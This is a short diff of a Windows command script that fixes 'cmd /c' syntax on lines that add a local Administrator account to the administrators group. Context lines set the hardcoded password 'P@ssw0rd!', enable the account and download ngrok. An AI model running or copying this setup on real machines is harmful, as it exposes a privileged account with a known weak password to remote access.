@@ -1,5 +1,5 @@
-cmd net user Administrator /add
-cmd net localgroup administrators Administrator /add
+cmd /c net user Administrator /add
+cmd /c net localgroup administrators Administrator /add
 Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
 Get-LocalUser -Name "Administrator" | Enable-LocalUser 
 Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
